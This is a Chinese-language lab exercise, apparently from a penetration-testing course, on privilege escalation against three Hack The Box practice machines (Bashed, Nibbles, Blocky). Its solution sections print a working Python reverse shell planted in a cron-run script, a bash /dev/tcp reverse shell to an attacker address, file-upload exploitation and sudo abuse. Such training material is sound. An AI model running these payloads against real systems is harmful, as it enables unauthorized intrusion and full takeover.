# 練習 C — 3 台 Linux 提權靶機

> 目標：在 3 台 HTB 機器上，從低權限 shell 提升到 root，練習 Ch 20–24 的各種技術。

## 練習說明

這 3 台機器你要**從頭打到底**，但重點是提權。如果拿初始 shell 有困難，可以看機器的 hint，但提權部分要自己找。

每台機器提權前，要先：
1. 跑完手動枚舉清單（Ch 20）
2. 跑 linPEAS
3. 分析結果，決定提權路徑
4. 執行提權

## 三台目標機器

| 機器 | OS | 提權技術 |
|------|-----|---------|
| **Bashed** | Linux | sudo python3 |
| **Nibbles** | Linux | sudo + writable script |
| **Devel** | Windows... | *(錯放，應選 Linux)* |

改為：

| 機器 | OS | 提權技術 |
|------|-----|---------|
| **Bashed** | Linux | sudo python3（直接） |
| **Nibbles** | Linux | sudo monitor.sh（可寫腳本） |
| **Blocky** | Linux | 設定檔密碼 + sudo ALL |

## 機器一：Bashed（sudo 直接提權）

```bash
TARGET="10.10.10.68"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 只開 80

# Step 2：Web 枚舉
gobuster dir -u http://$TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# 找到 /dev/ 目錄，裡面有 phpbash.php

# Step 3：利用 phpbash webshell
# 訪問 http://10.10.10.68/dev/phpbash.php → 直接有 webshell

# Step 4：升級為反彈 shell
# 在 phpbash 裡跑：
# python3 -c 'import socket,subprocess,os;...'

# Step 5：提權枚舉
# 先跑 sudo -l：
# www-data 可以以 scriptmanager 身份跑 ALL
sudo -u scriptmanager /bin/bash

# 切換到 scriptmanager 後
# ls /scripts → 有 root 跑的 python 腳本
# test.py 是誰的？你能寫嗎？
```

<details>
<summary>Bashed 提權解法</summary>

`sudo -u scriptmanager /bin/bash` 切換到 scriptmanager。

`/scripts/test.py` 是 scriptmanager 擁有，且 root 的 crontab 在執行它。

修改 test.py：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Kali 開監聽 `nc -nvlp 5555`，等 cron 執行拿到 root shell。

</details>

## 機器二：Nibbles（sudo writable script）

```bash
TARGET="10.10.10.75"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 開 22, 80

# Step 2：Web 枚舉
# 訪問 http://10.10.10.75 → 看 source code
# 找到 /nibbleblog/ 目錄

# Step 3：找 Nibbleblog 版本
# searchsploit nibbleblog
# 有 file upload exploit → 需要帳密

# Step 4：找帳密
# 試預設 admin:nibbles
# /nibbleblog/admin.php → 登入

# Step 5：File upload exploit
# searchsploit -m exploits/php/webapps/38489.rb
# 上傳 PHP shell 到 image plugin

# Step 6：提權枚舉
sudo -l
# nibbler 可以以 root NOPASSWD 跑：
# /home/nibbler/personal/stuff/monitor.sh

# Step 7：找那個腳本
ls -la /home/nibbler/personal/stuff/monitor.sh
# 不存在？或你能建立？
```

<details>
<summary>Nibbles 提權解法</summary>

`/home/nibbler/personal/stuff/monitor.sh` 不存在，但路徑你有寫入權限。

```bash
mkdir -p /home/nibbler/personal/stuff
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Kali 開監聽，拿到 root。

</details>

## 機器三：Blocky（設定檔密碼 + sudo）

```bash
TARGET="10.10.10.37"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 開 21, 22, 80, 8192, 25565

# Step 2：Web 枚舉
# 80 → WordPress 網站
gobuster dir -u http://$TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# 找到 /plugins/ 目錄，有 .jar 檔

# Step 3：分析 JAR 檔
# 下載 /plugins/BlockyCore.jar
# 解壓縮 jar，找設定類：
mkdir /tmp/blocky && cd /tmp/blocky
jar xf ~/htb/blocky/BlockyCore.jar
cat com/myfirstplugin/BlockyCore.class   # 看 bytecode
# 或用 jd-gui 反編譯

# Step 4：從 JAR 找到 RCON 密碼
# 有 sqlUser 和 sqlPass 常量
# 密碼可能就是 notch 的系統密碼

# Step 5：SSH 登入
ssh notch@10.10.10.37   # 試 JAR 裡的密碼

# Step 6：提權
sudo -l
# notch 可以以 (ALL : ALL) ALL
# → sudo bash 直接提權
```

<details>
<summary>Blocky 提權解法</summary>

`sudo -l` 顯示 `(ALL : ALL) ALL` → 任何指令都能以 root 跑。

```bash
sudo /bin/bash
id   # root
```

這就是密碼重用的威力：JAR 裡的資料庫密碼就是 SSH 密碼，SSH 密碼就是系統密碼，而這個使用者有 sudo ALL。

</details>

## 標準提權流程記錄

每台機器完成後，記錄：

```markdown
## 機器：Bashed

### 初始立足
- 枚舉發現：/dev/phpbash.php（直接 webshell）
- 類型：Web app 配置錯誤（開發工具留在生產）

### 提權路徑
- 發現方式：sudo -l
- 路徑：www-data → scriptmanager（sudo）→ root（cron + writable script）
- 步驟：
  1. sudo -u scriptmanager /bin/bash
  2. 修改 /scripts/test.py 為反彈 shell
  3. 等 cron 觸發

### 關鍵截圖
- [ ] whoami（www-data）+ local.txt
- [ ] whoami（scriptmanager）
- [ ] whoami（root）+ proof.txt + ifconfig
```

## 完成標準

| 機器 | 標準 |
|------|------|
| Bashed | 拿到 root，截圖 proof.txt 和 ifconfig |
| Nibbles | 拿到 root，截圖 proof.txt 和 ifconfig |
| Blocky | 拿到 root，截圖 proof.txt 和 ifconfig |

每台機器都要有完整筆記，說明提權路徑和每個步驟的指令。

## 自我檢核

- [ ] 跑過完整的手動枚舉清單（Ch 20）
- [ ] 跑過 linPEAS，正確識別了提權路徑
- [ ] 3 台機器都拿到 root
- [ ] 3 台機器都有完整筆記和截圖

→ [Ch 25 Windows 提權方法論：環境收集清單](./25-windows-privesc-methodology.md)
